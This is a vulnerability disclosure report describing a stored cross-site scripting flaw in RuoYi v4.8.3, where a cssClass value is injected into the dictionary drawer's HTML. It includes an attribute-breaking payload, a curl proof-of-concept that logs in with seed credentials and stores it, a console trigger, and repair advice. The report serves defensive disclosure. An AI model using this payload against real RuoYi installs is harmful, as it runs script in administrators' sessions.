# RuoYi v4.8.3 Dictionary Data Preview cssClass Context Injection Leading to Stored Cross-Site Scripting

> Conclusion: Reportable. The dictionary-data drawer preview added in v4.8.3 inserts a persisted `cssClass` value directly into an HTML attribute. An authenticated account with `system:dict:add` can store an event-handler attribute. When a victim opens the preview and moves the mouse over the malicious entry, the script runs in that user's RuoYi admin session.
>
> Suggested severity: High. CVSS 3.1 reference score 8.3 (`AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`). This score is an assessment suggestion, not an assigned CVE score.

## NAME OF AFFECTED PRODUCT(S)

RuoYi

## Vendor Homepage

https://ruoyi.vip/

Source repository: https://github.com/yangzongzhuan/RuoYi

## AFFECTED AND/OR FIXED VERSION(S)

Affected Version:

v4.8.3, including at least the official `master` source that corresponds to v4.8.3.

Fixed Version:

Unknown. No public release containing a fix was found during this review.

## Vuldb Submitter

Bob-wentao

## Vulnerable File

- ruoyi-admin/src/main/resources/templates/system/dict/type/type.html
- ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDictDataController.java
- ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysDictData.java
- ruoyi-common/src/main/java/com/ruoyi/common/xss/XssHttpServletRequestWrapper.java
- ruoyi-common/src/main/java/com/ruoyi/common/utils/html/HTMLFilter.java

## Vulnerable Code

### 1. Attacker-controlled input and persistence

`POST /system/dict/data/add` requires only `system:dict:add`, then passes the bound `SysDictData` object to the service layer for storage:

~~~java
// ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDictDataController.java:79-86
@RequiresPermissions("system:dict:add")
@PostMapping("/add")
@ResponseBody
public AjaxResult addSave(@Validated SysDictData dict)
{
    dict.setCreateBy(getLoginName());
    return toAjax(dictDataService.insertDictData(dict));
}
~~~

`cssClass` has a length limit only. There is no whitelist check for a CSS class token:

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysDictData.java:111-119
@Size(min = 0, max = 100, message = "样式属性长度不能超过100个字符")
public String getCssClass()
{
    return cssClass;
}
~~~

The service layer and MyBatis mapping keep the field:

~~~java
// ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDictDataServiceImpl.java:84-91
public int insertDictData(SysDictData data)
{
    int row = dictDataMapper.insertDictData(data);
    if (row > 0)
    {
        List<SysDictData> dictDatas = dictDataMapper.selectDictDataByType(data.getDictType());
        DictUtils.setDictCache(data.getDictType(), dictDatas);
    }
    return row;
}
~~~

~~~xml
<!-- ruoyi-system/src/main/resources/mapper/system/SysDictDataMapper.xml:95-118 -->
<insert id="insertDictData" parameterType="SysDictData">
    ...
    <if test="cssClass != null and cssClass != ''">css_class,</if>
    ...
    <if test="cssClass != null and cssClass != ''">#{cssClass},</if>
    ...
</insert>
~~~

### 2. Input filtering is not context-safe encoding

With the default `xss.enabled: true`, POST parameters under `/system/*` pass through `EscapeUtil.clean()`. That helper mainly strips HTML tags. On the plain-text path in `HTMLFilter`, double quotes are kept instead of being encoded as HTML entities:

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/xss/XssHttpServletRequestWrapper.java:23-35
String[] values = super.getParameterValues(name);
...
escapseValues[i] = EscapeUtil.clean(values[i]).trim();
~~~

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/utils/html/HTMLFilter.java:515-530
private String encodeQuotes(final String s)
{
    if (encodeQuotes)
    {
        ...
        // 不替换双引号为&quot;，防止json格式无效
        m.appendReplacement(buf, Matcher.quoteReplacement(one + two + three));
        ...
    }
}
~~~

This is not an encoder for HTML attribute context. `cssClass` starts as a normal parameter, then later is placed inside a double-quoted `class` attribute.

### 3. The new dictionary drawer reinterprets the value as HTML

v4.8.3 added `view()` / `renderDrawer()` on the dictionary-type page. The server-returned `cssClass` is concatenated into HTML and then parsed with jQuery `.html()`:

~~~javascript
// ruoyi-admin/src/main/resources/templates/system/dict/type/type.html:220-240
for (var i = 0; i < rows.length; i++) {
    var r = rows[i];
    var labelHtml = r.dictLabel;
    if (r.listClass && r.listClass !== 'default') {
        labelHtml = '<span class="badge badge-' + r.listClass + '">' + r.dictLabel + '</span>';
    } else if (r.cssClass) {
        labelHtml = '<span class="' + r.cssClass + '">' + r.dictLabel + '</span>';
    }

    html += '  <div class="dict-card-row"><div class="dict-card-key">标签</div>'
         + '<div class="dict-card-val">' + labelHtml + '</div></div>';
    html += '  <div class="dict-card-row"><div class="dict-card-key">键值</div>'
         + '<div class="dict-card-val"><code>' + r.dictValue + '</code></div></div>';
}
$("#drawerBody").html(html);
~~~

Input:

~~~text
cssClass=x" onmouseover="document.body.dataset.cveProbe=1
listClass=(empty)
~~~

becomes:

~~~html
<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
~~~

The full transfer chain is: POST parameter → `XssHttpServletRequestWrapper` → database/cache → dictionary-data list JSON → `renderDrawer()` → innerHTML → event attribute.

## VERSION(S)

Affected Version:

v4.8.3

Tested Commit:

Upstream source commit: `3b3941abeb5402297e5b4de82a30e6471c2239f3`  
Local worktree HEAD: `1a19343edc330b01d205c51f1cbcf02b557e7d14` (contains only additional existing report files)

## Software Link

- https://github.com/yangzongzhuan/RuoYi/tree/master
- https://github.com/yangzongzhuan/RuoYi/releases/tag/v4.8.3

## PROBLEM TYPE

Vulnerability Type:

Stored Cross-Site Scripting (Stored XSS)

CWE:

CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Root Cause

The root cause is a lost trust boundary between two HTML contexts:

1. `cssClass` is accepted as a persistable style string, with a length check only;
2. The default XSS filter does not encode quotes in plain text for HTML attribute context;
3. The new dictionary drawer inserts that string into `<span class="...">` and hands it to `.html()`;
4. A quote can therefore close the `class` attribute and add an event handler.

Dynamic testing observed a browser-parsed `onmouseover` attribute and its execution result.

## Evidence and Reasoning

Evidence status:

- Candidate: `cssClass` is concatenated into an HTML attribute;
- Reachable: a non-admin `ry` account with `system:dict:add` stored the attack string;
- Impact-Proven: after an administrator loaded the dictionary drawer, the event attribute appeared; dispatching `mouseover` set `document.body.dataset.cveProbe` to `"1"`;
- Reportable: the default v4.8.3 page and `xss.enabled: true` both include this path; v4.8.2 does not have this drawer; related public records and historical differences were checked.

The lab application container used Java 17 and `ruoyi-admin/target/ruoyi-admin.jar` built from the current source. SHA-256:

~~~text
1de0fd350a10b73e17215d3db0f1f2b4c4e1daa0aa2b239cf49c6cec4786279b
~~~

The lab only disabled captcha for easier login, changed the port to `18081`, and explicitly enabled CSRF to test a stricter condition. XSS filtering was not disabled. Frontend and dictionary-render code were not modified. The CSRF token was obtained from the normal `/index` and `/system/dict` pages, so that overlay does not change the XSS sink proof.

## Impact

Proven: an attacker-stored JavaScript event handler executes in another administrator's authenticated RuoYi page. The execution context is a same-origin RuoYi admin page, so the script has the access that the victim browser already has to that origin's admin pages and APIs.

This report treats only "script execution in an administrator context" as verified impact. Creating a backdoor account, reading specific business data, and other unreplayed consequences are not counted as measured results.

## Exploitation Prerequisites

- The attacker needs a logged-in account granted `system:dict:add`. Super-admin is not required.
- The default SQL `ry` / `admin123` account is a lab non-admin user. Its `common` role is granted dictionary-management button permissions in the bundled seed data. In a real deployment, any ordinary role with that permission is sufficient.
- The victim needs dictionary-list permission, opens `/system/dict`, clicks a dictionary type (the lab used `sys_normal_disable`, `dictId=3`) to open the drawer, then moves the mouse over the malicious label card. That interaction is a normal hover.
- Default `xss.enabled: true` does not block this attack. Default `csrf.enabled: false` does not raise the write barrier either. The lab enabled CSRF and still completed the full verification.
- No file upload, database write privilege, local server access, or XSS-filter disablement is required.

## DESCRIPTION

RuoYi v4.8.3 added a drawer-style data preview to the dictionary-type list, but `renderDrawer()` inserts a persisted `cssClass` value directly into an HTML attribute. RuoYi's input cleaner does not encode double quotes for the output context. A low-privilege dictionary maintainer can store an event attribute that later runs on an administrator preview page. This path crosses the trust boundary from a low-privilege maintainer account to a higher-privilege administrator browser. It should be fixed in a released version and covered by browser-level regression tests.

## Vulnerability Location:

- Write entry: `POST /system/dict/data/add`, parameter `cssClass`. The edit entry `POST /system/dict/data/edit` is also affected.
- Preview entry: dictionary-type links on `/system/dict`. v4.8.3 added `view(dictId)`.
- Trigger field: `SysDictData.cssClass`. When `listClass` is empty, the `else if (r.cssClass)` branch is taken.
- Final sink: `ruoyi-admin/src/main/resources/templates/system/dict/type/type.html:231,240`.

## Reproduction Steps

The steps below target a local Docker lab at `http://127.0.0.1:18081`. For a normal install, replace the base URL and use a real account that has `system:dict:add`.

1. Start the default v4.8.3 application and bundled SQL. The lab used Java 17 and MySQL 8.0. Captcha was disabled only so command-line reproduction did not depend on image recognition.
2. Log in as `ry` / `admin123`. This account is a non-admin user in the lab seed data.
3. Open `/index` to initialize the session token, then open `/system/dict` and read `meta[name="csrf-token"]`. If the target uses the default `csrf.enabled: false`, the `X-CSRF-Token` header in the request below can be omitted.
4. Create dictionary data with the PoC request below.
5. Open `/index` as an administrator, then open `/system/dict`.
6. Click dictionary type `sys_normal_disable` and wait for the drawer to load dictionary data.
7. Move the mouse over the label on the `E2E_XSS_PROBE` card, or run the `dispatchEvent` snippet from the PoC in that page's developer console.
8. Observe `document.body.dataset.cveProbe` becoming `"1"`. That proves the event attribute was parsed and executed by the browser.
9. Delete the test dictionary data with the cleanup command at the end of the PoC.

## POC

### Low-privilege write

~~~bash
BASE='http://127.0.0.1:18081'
WORK_DIR="$(mktemp -d /tmp/ruoyi-dict-xss-XXXXXX)"
COOKIE_FILE="$WORK_DIR/cookie.txt"

# captchaEnabled=false is lab-only; a normal deployment uses the regular login flow.
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" -X POST "$BASE/login" \
  --data 'username=ry&password=admin123&rememberMe=false'

# SysIndexController creates csrf_token here. Skip this step and the header if CSRF is off.
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/index" >/dev/null
DICT_PAGE="$(curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/system/dict")"
CSRF_TOKEN="$(printf '%s\n' "$DICT_PAGE" \
  | sed -n 's/.*content="\([^"]*\)" name="csrf-token".*/\1/p' | head -1)"

curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/add" \
  --data-urlencode 'dictLabel=E2E_XSS_PROBE' \
  --data-urlencode 'dictValue=cve_e2e_xss_20260906' \
  --data-urlencode 'dictType=sys_normal_disable' \
  --data-urlencode 'dictSort=9995' \
  --data-urlencode 'cssClass=x" onmouseover="document.body.dataset.cveProbe=1' \
  --data-urlencode 'listClass=' \
  --data-urlencode 'status=0' \
  --data-urlencode 'isDefault=N'
~~~

Expected write response:

~~~json
{"msg":"操作成功","code":0}
~~~

The tested low-privilege write was:

~~~text
create_by = ry
css_class = x" onmouseover="document.body.dataset.cveProbe=1
list_class = NULL
~~~

### Administrator trigger

After the administrator opens the `sys_normal_disable` drawer on `/system/dict`, run this in the browser console:

~~~javascript
const injected = document.querySelector('#drawerBody span[onmouseover]');
console.log(injected.outerHTML);
injected.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
console.log(document.body.dataset.cveProbe);
~~~

Expected output:

~~~text
<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
1
~~~

Observed in the Docker lab:

~~~text
LOW_ADD={"msg":"操作成功","code":0}
LOW_ID=104
before.evil=<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
trigger.probe=1
after=1
LOW_REMOVE={"msg":"操作成功","code":0}
DB_REMAINING=0
~~~

### Cleanup

Call the remove API with the returned `dict_code`. In this lab it was `104`:

~~~bash
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/remove" \
  --data-urlencode 'ids=104'
~~~

If cleanup is limited to an isolated lab database, this exact condition also works:

~~~sql
DELETE FROM sys_dict_data WHERE dict_value = 'cve_e2e_xss_20260906';
~~~

## Benign Control

A same-entrypoint benign control is required for resource-exhaustion, crash, or parser-amplification issues. This report is script injection, so that resource control does not apply. As a code-level control, `cssClass=label-safe` with empty `listClass` should render a normal `<span class="label-safe">...</span>`, must not create an `onmouseover` attribute, and must not change `document.body.dataset.cveProbe`.

## Authentication and User Interaction

Authentication is required, but super-admin is not. The write endpoint requires `system:dict:add`. The victim needs dictionary-list permission, must open the drawer, and must hover once. The lab `ry` account is a non-admin user, and the write also succeeded with CSRF enabled. The vulnerability therefore does not depend on CSRF being off by default.

## Historical Difference

Search scope included official RuoYi issues, v4.8.2/v4.8.3 file snapshots, public CVE/GHSA records, and related change history. Search date: 2026-09-06.

### Difference from older versions

v4.8.2 `system/dict/type/type.html` has no drawer `view()` / `renderDrawer()` path. v4.8.3 added that path and concatenated `cssClass` into `<span class="...">` inside `renderDrawer()`. That is the version boundary and introduction point for this report:

- v4.8.2 file snapshot: https://raw.githubusercontent.com/yangzongzhuan/RuoYi/v4.8.2/ruoyi-admin/src/main/resources/templates/system/dict/type/type.html
- v4.8.3 file snapshot: https://raw.githubusercontent.com/yangzongzhuan/RuoYi/v4.8.3/ruoyi-admin/src/main/resources/templates/system/dict/type/type.html

### Difference from already public issues

- RuoYi issue #212 discusses escaped display of `<` in older dictionary labels. It does not involve inserting a `cssClass` attribute value into the new drawer HTML sink: https://github.com/yangzongzhuan/RuoYi/issues/212
- Issue #320 uses notice rich-text `noticeContent` and `th:utext` as source/sink, and depends on XSS exclusion rules for `/system/notice/*`. This report uses `cssClass` on `/system/dict/data/add` as the source and the v4.8.3 dictionary-drawer innerHTML as the sink: https://github.com/yangzongzhuan/RuoYi/issues/320
- Issue #329 uses notice titles as the source and the home-page notice dropdown as the sink. This report does not go through the notice module: https://github.com/yangzongzhuan/RuoYi/issues/329
- Issue #308 is an older menu-management `menuName` rendering issue. Affected files, fields, pages, and version range are different. This report targets the dictionary preview path added in v4.8.3: https://github.com/yangzongzhuan/RuoYi/issues/308
- CVE-2024-57438 / GHSA-h5jh-rp76-q242 is privilege escalation via older role assignment, not this script-injection path: https://github.com/advisories/GHSA-h5jh-rp76-q242
- A role-authorization chain found during sub-agent recheck overlaps public CVE-2025-10989 and was excluded from this report: https://nvd.nist.gov/vuln/detail/CVE-2025-10989

This report therefore does not resubmit notice XSS, menu XSS, older role-privilege issues, or CSRF being disabled by default. It reports a new dictionary-data input field and a new v4.8.3 frontend sink.

## Suggested Repair

1. Do not concatenate `cssClass`, `dictLabel`, `dictValue`, or `listClass` into HTML strings. Build nodes with `document.createElement()`, `textContent`, and `element.className` / `classList`.
2. If class extension must remain, allow only one or a few class tokens on the server, for example `[A-Za-z0-9_-]{1,64}`. Reject quotes, whitespace, `<`, `>`, and event-attribute characters. Use a fixed enum for `listClass`.
3. Encode at the output point for the actual context. Do not rely on a generic request-parameter cleaner. The fix should cover add and edit APIs, and should clean or re-encode dangerous values already stored in the database.
4. Add a regression test: after writing `cssClass=x" onmouseover="...`, the drawer DOM must not contain event attributes. Also verify that legitimate styles such as `primary` and `danger` still render.
